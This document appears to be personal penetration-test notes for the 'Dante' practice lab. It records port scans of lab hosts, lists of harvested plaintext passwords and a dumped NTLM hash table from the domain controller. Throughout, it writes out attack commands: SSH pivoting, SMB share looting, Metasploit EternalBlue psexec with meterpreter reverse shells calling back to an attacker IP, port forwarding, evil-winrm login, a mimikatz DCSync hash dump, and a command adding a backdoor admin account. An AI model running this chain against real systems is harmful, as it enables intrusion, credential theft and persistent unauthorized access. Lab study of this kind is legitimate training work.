# Dante

## External Enumeration

### 10.10.110.100

```
21/tcp open ftp vsftpd 3.0.3
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
65000/tcp open http Apache httpd 2.4.41 ((Ubuntu))
```

### Website

```
http://10.10.110.100:65000/wordpress/
```

### Usernames

```
Kevin
Balthazar
AJ
Nathan
```

## Webhost

```
# Creds
## Linux
root:qawsedrftgyhujikol
james Toyota
balthazar TheJoker12345!
## Database
root:qawsedrftgyhujikol
james:Toyota
margaret:Welcome1!2@3#
ben:Welcometomyblog
mrb3n:S3kur1ty2020!
asmith:Princess1
smoggat:Summer2019
tmodle:P45678!
ccraven:Password1
kploty:Teacher65
jbercov:4567Holiday1
whaguey:acb123
dcamtan:WorldOfWarcraft67
tspadly:RopeBlackfieldForwardslash
ematlis:JuneJuly1TY
fglacdon:FinalFantasy7
tmentrso:65RedBalloons
dharding:WestminsterOrange5
smillar:MarksAndSparks91
bjohnston:Bullingdon1
iahmed:Sheffield23
plongbottom:PowerfixSaturdayClub777
jcarrot:Tanenbaum0001
lgesley:SuperStrongCantForget123456789
```

## Port Forward

{% code overflow="wrap" %}
```bash
sshuttle -v -r root@10.10.110.100 172.16.1.0/24
```
{% endcode %}

## Internal Hosts

```
172.16.1.5
172.16.1.10 - DANTE-NIX02 - Done
172.16.1.12 - DANTE-NIX04 - Done
172.16.1.13 - DANTE-WS01 - Done
172.16.1.17 - DANTE-NIX03 - Done
172.16.1.19
172.16.1.20 - DANTE-DC01 - Done
172.16.1.100 - DANTE-WEB01-NIX01 - Done
172.16.1.101 - DANTE-WS02 - Done
172.16.1.102 - DANTE-WS03 - Done
```

## 172.16.1.10

{% code overflow="wrap" %}
```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{% endcode %}

### Attack Path

```bash
# Enumerate SMB Shares
proxychains smbclient -L \\172.16.1.10
# Connect to share
proxychains smbclient \\\\172.16.1.10\\SlackMigration
# Download admintasks.txt
get admintasks.txt
```

## 172.16.1.5

```
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          FileZilla ftpd
111/tcp  open  rpcbind      2-4 (RPC #100000)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2019 15.00.2000
2049/tcp open  mountd       1-3 (RPC #100005)
```

## 172.16.1.12

```
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
443/tcp  open  ssl/http Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
3306/tcp open  mysql?
```

## 172.16.1.13

```
```

## 172.16.1.17

### Enumeration

```
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.41
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.900 (Webmin httpd)
```

### Walkthrough

```bash
# List network shares
smbclient \\172.16.1.17\forensics
# Connect to network share
smbclient \\\\172.16.1.17\\forensics
# Download file
get monitor
# Check file type
file monitor
# Rename file to be a pcap file
mv monitor monitor.pcap
# Open file with WireShark
wireshark monitor.pcap
# Right click on first http packet and select follow HTTP Stream
# Take a note of the credentials. 
admin:password6543
# Credentials don't work so check for more http sessions to follow next one contains
admin:Password6543
```

## 172.16.1.19

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.41
8080/tcp open  http    Jetty 9.4.27.v20200227
```

## 172.16.1.20

{% code overflow="wrap" %}
```
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH for_Windows_8.1 (protocol 2.0)
53/tcp    open  domain             Simple DNS Plus
80/tcp    open  http               Microsoft IIS httpd 8.5
88/tcp    open  kerberos-sec       Microsoft Windows Kerberos (server time: 2022-12-31 10:27:25Z)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
389/tcp   open  ldap               Microsoft Windows Active Directory LDAP (Domain: DANTE.local, Site: Default-First-Site-Name)
443/tcp   open  ssl/http           Microsoft IIS httpd 8.5
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: DANTE)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap               Microsoft Windows Active Directory LDAP (Domain: DANTE.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
```
{% endcode %}

```bash
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 172.16.1.20
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
run

```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9bff06fe611486579fb74037890fda96:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:49e6f37ede481d09747f6a0c9abcbaa7:::
SelfHealUser:1001:aad3b435b51404eeaad3b435b51404ee:236a174dfe9cf1f702ae493d934fb70e:::
katwamba:1002:aad3b435b51404eeaad3b435b51404ee:14a71f9e65448d83e8c63d46355837c3:::
mrb3n:2104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
xadmin:7104:aad3b435b51404eeaad3b435b51404ee:649f65073a6672a9898cb4eb61f9684a:::
DANTE-DC01$:1003:aad3b435b51404eeaad3b435b51404ee:edb26d812241e7a6f8cc9af10c1e147d:::
MediaAdmin$:1117:aad3b435b51404eeaad3b435b51404ee:26e1c38a3fe9d0f830215891e623cc90:::
```

## 172.16.1.101

```
PORT    STATE SERVICE       VERSION
21/tcp  open  ftp           FileZilla ftpd
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
```

## 172.16.1.102

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.0)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.0)
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MySQL (unauthorized)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

## 172.16.2.5

{% code overflow="wrap" %}
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.2.5
set THREADS 10
run

use exploit/windows/smb/ms17_010_psexec
set RHOSTS 172.16.1.20
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
run

run autoroute -s 172.16.2.0/24
portfwd add -L 127.0.0.1 -l 5985 -p 5985 -r 172.16.2.5

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 10.10.14.6
set lport 443
set exitfunc thread
run


portfwd add -L 127.0.0.1 -l 53 -p 53 -r 172.16.2.5
portfwd add -L 127.0.0.1 -l 88 -p 88 -r 172.16.2.5
portfwd add -L 127.0.0.1 -l 135 -p 135 -r 172.16.2.5
portfwd add -L 127.0.0.1 -l 139 -p 139 -r 172.16.2.5
portfwd add -L 127.0.0.1 -l 389 -p 389 -r 172.16.2.5
portfwd add -L 127.0.0.1 -l 445 -p 445 -r 172.16.2.5
portfwd add -L 127.0.0.1 -l 5985 -p 5985 -r 172.16.2.5

portfwd add -L 127.0.0.1 -l 53 -p 53 -r 172.16.2.5;portfwd add -L 127.0.0.1 -l 88 -p 88 -r 172.16.2.5;portfwd add -L 127.0.0.1 -l 135 -p 135 -r 172.16.2.5;portfwd add -L 127.0.0.1 -l 139 -p 139 -r 172.16.2.5;portfwd add -L 127.0.0.1 -l 389 -p 389 -r 172.16.2.5;portfwd add -L 127.0.0.1 -l 445 -p 445 -r 172.16.2.5;portfwd add -L 127.0.0.1 -l 5985 -p 5985 -r 172.16.2.5

evil-winrm -i 127.0.0.1 -u jbercov -p myspace7

mimikatz.exe
lsadump::dcsync /domain:DANTE.ADMIN /user:Administrator
4c827b7074e99eefd49d05872185f7f8

net user Admin_129834765 SamsungOctober102030 /add
```
{% endcode %}



